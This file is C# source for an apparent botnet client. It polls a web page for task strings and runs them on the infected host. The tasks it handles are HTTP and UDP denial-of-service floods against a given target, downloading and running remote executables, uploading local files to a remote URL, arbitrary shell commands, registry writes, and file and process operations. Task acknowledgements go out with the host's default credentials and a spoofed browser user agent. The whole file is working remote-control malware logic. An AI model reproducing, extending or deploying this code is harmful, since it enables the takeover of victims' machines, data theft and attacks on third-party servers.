using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using CsQuery;

namespace Kuriyama.net
{
    class Connection
    {
        string url;
        int timeout;
        info.SysInfo info = new info.SysInfo();
        //string hwid;
        public Connection(string url, int timeout)
        {
            this.url = url;
            this.timeout = timeout;
            //hwid = info.hwid();
        }

        public void Run()
        {
            while (true)
            {
                string[] tasks = getTasks(url);
                
                
                    
                    for (int i = 0; i < tasks.Length - 1; i++)
                    {
                    
                    string task = tasks[i];
                    string type = task.Split(';')[0];
                    string subtype = task.Split(';')[1];
                    if (type.Equals("ddos"))
                    {
                        string target = task.Split(';')[2];
                        string duration = task.Split(';')[3];
                        string taskid = task.Split(';')[4];

                        if (subtype.Equals("http"))
                        {
                            try
                            {
                                new Thread(() => new ddos.HTTP().attack(target, duration)).Start();
                                get(taskid);
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine(e.ToString());
                            }
                            
                        }
                        else if (subtype.Equals("udp"))
                        {
                            try
                            {
                                new Thread(() => new ddos.UDP().attack(target, Convert.ToInt32(duration))).Start();
                                get(taskid);
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine(e.ToString());
                            }
                            
                        }
                    }
                    else if (type.Equals("files"))
                    {
                        if (subtype.Equals("search"))
                        {
                            string filename = task.Split(';')[2];
                            string taskid = task.Split(';')[3];
                            try
                            {
                                if(new files.FileWorker().SearchFile(filename) != null)
                                    new Thread(() => get(taskid)).Start();
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine(e.ToString());
                            }
                            
                        }
                        else if (subtype.Equals("write"))
                        {
                            string path = task.Split(';')[2];
                            string content = task.Split(';')[3];
                            string taskid = task.Split(';')[4];
                            try
                            {
                                new Thread(() => new files.FileWorker().WriteToFile(path, content)).Start();
                                get(taskid);
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine(e.ToString());
                            }
                            
                        }
                    }
                    else if (type.Equals("net"))
                    {
                        if (subtype.Equals("load"))
                        {
                            string url = task.Split(';')[2];
                            string name = task.Split(';')[3];
                            string taskid = task.Split(';')[4];
                            try
                            {
                                new net.Loader().Download(url, name);
                                new Thread(() => new system.SystemWorker().runProcess(name)).Start();
                                get(taskid);
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine(e.ToString());
                            }
                            
                        }
                        else if (subtype.Equals("upload"))
                        {
                            string url = task.Split(';')[2];
                            string name = task.Split(';')[3];
                            string taskid = task.Split(';')[4];
                            try
                            {
                                new Thread(() => new net.Uploader().UploadToUrl(url, name)).Start();
                                get(taskid);
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine(e.ToString());
                            }
                            
                        }
                        
                    }
                    else if (type.Equals("system"))
                    {
                        if (subtype.Equals("cmd"))
                        {
                            string command = task.Split(';')[2];
                            string taskid = task.Split(';')[3];
                            try
                            {
                                new Thread(() => new system.SystemWorker().cmd(command)).Start();
                                get(taskid);
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine(e.ToString());
                            }
                            
                        }
                        else if (subtype.Equals("registry"))
                        {
                            string key = task.Split(';')[2];
                            string key_name = task.Split(';')[3];
                            string value = task.Split(';')[4];
                            string taskid = task.Split(';')[5];
                            try
                            {
                                new Thread(() => new system.SystemWorker().CreateRegKey(key, key_name, value)).Start();
                                get(taskid);
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine(e.ToString());
                            }
                            

                        }
                        else if (subtype.Equals("check_process"))
                        {
                            string procName = task.Split(';')[2];
                            string taskid = task.Split(';')[3];
                            try
                            {
                                
                                if (new system.SystemWorker().FindProcess(procName))
                                    new Thread(() => get(taskid)).Start();
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine(e.ToString());
                            }
                            

                        }
                        else if (subtype.Equals("run_process"))
                        {
                            string path = task.Split(';')[2];
                            string taskid = task.Split(';')[3];
                            try
                            {
                                new Thread(() => new system.SystemWorker().runProcess(path)).Start();
                                get(taskid);
                            }
                            catch(Exception e)
                            {
                                Console.WriteLine(e.ToString());
                            }
                            
                        }

                        
                    }
                }
                Thread.Sleep(timeout * 60 * 1000);

            }
        }

        public string get(string url)
        {
            try
            {
                WebRequest request = WebRequest.Create(url);
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
                WebResponse response = request.GetResponse();
                Stream dataStream = response.GetResponseStream();
                StreamReader reader = new StreamReader(dataStream);
                string r = reader.ReadToEnd();
                return r;

            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                return null;
            }
        }

        public string[] getTasks(string url1)
        {
            //Upload;Link;Id|Download;Link;Id|Ddos;Link;Duration;Id|Search;Filename;Id
            CQ dom = get(url1);
            return dom["#_tl_editor"].Text().Replace("Kur", "").Split('!');
        }


    }
}
